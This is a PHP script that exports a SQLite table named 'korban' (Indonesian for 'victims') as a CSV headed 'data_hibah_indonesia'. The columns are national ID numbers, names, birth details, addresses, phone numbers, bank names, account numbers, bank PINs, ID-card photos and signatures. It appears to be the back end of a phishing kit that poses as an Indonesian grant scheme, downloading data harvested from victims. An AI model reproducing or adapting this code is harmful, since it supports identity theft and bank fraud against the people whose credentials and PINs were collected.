<?php
$db = new SQLite3('database.db');
$results = $db->query("SELECT * FROM korban ORDER BY id DESC");
header('Content-Type: text/csv; charset=utf-8');
header('Content-Disposition: attachment; filename="data_hibah_indonesia_'.date('Y-m-d').'.csv"');
$f = fopen('php://output', 'w');
fputcsv($f, ['ID','NIK','Nama','Tempat','Tgl Lahir','Jenis Kelamin','Alamat','HP','Bank','Rekening','PIN','Foto KTP','TTD','Waktu']);
while($row = $results->fetchArray()) {
    fputcsv($f, [
        $row['id'], $row['nik'], $row['nama'], $row['tempat'],
        $row['tgl_lahir'], $row['jenis_kelamin'], $row['alamat'],
        $row['hp'], $row['bank'], $row['rekening'], $row['pin'],
        $row['foto_ktp'], $row['ttd'], $row['waktu']
    ]);
}
fclose($f);
exit();
?>